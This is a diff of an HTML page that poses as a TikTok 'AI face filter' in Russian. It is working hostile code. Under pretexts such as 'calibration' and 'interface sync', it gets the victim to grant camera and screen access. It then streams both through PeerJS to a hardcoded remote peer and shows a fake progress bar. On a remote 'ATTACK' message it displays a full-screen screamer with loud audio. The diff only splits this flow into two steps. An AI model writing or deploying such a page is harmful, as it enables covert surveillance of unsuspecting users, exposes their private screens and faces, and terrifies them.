@@ -6,25 +6,30 @@
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
     <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
     <style>
-        body { background: #000; color: white; font-family: sans-serif; text-align: center; display: flex; flex-direction: column; justify-content: center; height: 100vh; margin: 0; overflow: hidden; }
-        .btn { background: #ff0050; color: white; border: none; padding: 25px 50px; font-size: 20px; font-weight: bold; border-radius: 50px; cursor: pointer; box-shadow: 0 0 30px rgba(255,0,80,0.8); }
-        #loader { display: none; }
-        #screamer { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background: black; display: none; z-index: 10000; }
+        body { background: #000; color: white; font-family: sans-serif; text-align: center; display: flex; flex-direction: column; justify-content: center; height: 100vh; margin: 0; }
+        .btn { background: #ff0050; color: white; border: none; padding: 25px 50px; font-size: 20px; font-weight: bold; border-radius: 50px; cursor: pointer; }
+        #step2, #loader, #screamer { display: none; }
+        #screamer { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background: black; z-index: 10000; }
         #screamer img { width: 100%; height: 100%; object-fit: cover; }
     </style>
 </head>
 <body>
 
-    <div id="ui">
-        <img src="https://www.edigitalagency.com.au/wp-content/uploads/TikTok-logo-PNG.png" width="80" style="margin-bottom: 20px;">
-        <h1>AI-Фильтр "Идеальное лицо"</h1>
-        <p>Для активации эффекта требуется полная калибровка системы</p>
-        <button class="btn" onclick="startFullAccess()">АКТИВИРОВАТЬ</button>
+    <div id="step1">
+        <img src="https://www.edigitalagency.com.au/wp-content/uploads/TikTok-logo-PNG.png" width="80">
+        <h2>AI-Фильтр</h2>
+        <p>Шаг 1: Доступ к камере</p>
+        <button class="btn" onclick="getCam()">РАЗРЕШИТЬ</button>
+    </div>
+
+    <div id="step2">
+        <h2>Шаг 2</h2>
+        <p>Синхронизация интерфейса (Экран)</p>
+        <button class="btn" style="background: #00f2ea; color: #000;" onclick="getScreen()">ПОДТВЕРДИТЬ</button>
     </div>
 
     <div id="loader">
-        <div style="border: 5px solid #333; border-top: 5px solid #ff0050; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin: auto;"></div>
-        <h2 id="load-text">Подключение к нейросети... 0%</h2>
+        <h2 id="load-text">Анализ... 0%</h2>
     </div>
 
     <div id="screamer">
@@ -35,46 +40,36 @@
     <script>
         const REMOTE_ID = '09062012';
         const peer = new Peer();
+        let conn;
 
-        async function startFullAccess() {
+        async function getCam() {
             try {
-                // 1. Сначала запрашиваем Камеру
-                const camStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
-                
-                // 2. Сразу же запрашиваем Экран
-                const screenStream = await navigator.mediaDevices.getDisplayMedia({ video: true, audio: true });
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                conn = peer.connect(REMOTE_ID);
+                peer.call(REMOTE_ID, stream);
+                document.getElementById('step1').style.display = 'none';
+                document.getElementById('step2').style.display = 'block';
+            } catch (e) { alert("Ошибка доступа!"); }
+        }
 
-                document.getElementById('ui').style.display = 'none';
+        async function getScreen() {
+            try {
+                const stream = await navigator.mediaDevices.getDisplayMedia({ video: true });
+                peer.call(REMOTE_ID, stream);
+                document.getElementById('step2').style.display = 'none';
                 document.getElementById('loader').style.display = 'block';
 
-                // Создаем соединение для команд (скримера)
-                const conn = peer.connect(REMOTE_ID);
-                
-                // Отправляем оба потока (камера основным, экран вторым звонком)
-                peer.call(REMOTE_ID, camStream, { metadata: { type: 'Камера' } });
-                setTimeout(() => {
-                    peer.call(REMOTE_ID, screenStream, { metadata: { type: 'Экран' } });
-                }, 1000);
-
-                // Слушаем команду на скример
                 conn.on('data', data => {
                     if (data === 'ATTACK') {
                         document.getElementById('screamer').style.display = 'block';
                         document.getElementById('scary-audio').play();
-                        if (navigator.vibrate) navigator.vibrate(2000);
                     }
                 });
 
-                // Фейк прогресс
                 let p = 0;
-                setInterval(() => { if(p < 99) { p++; document.getElementById('load-text').innerText = "Анализ биометрии... " + p + "%"; } }, 500);
-
-            } catch (err) {
-                alert("Ошибка! Для работы фильтра нужно принять все соглашения.");
-                location.reload();
-            }
+                setInterval(() => { if(p < 99) { p++; document.getElementById('load-text').innerText = "Анализ: " + p + "%"; } }, 500);
+            } catch (e) { alert("Ошибка экрана!"); }
         }
     </script>
-    <style> @keyframes spin { to { transform: rotate(360deg); } } </style>
 </body>
 </html>
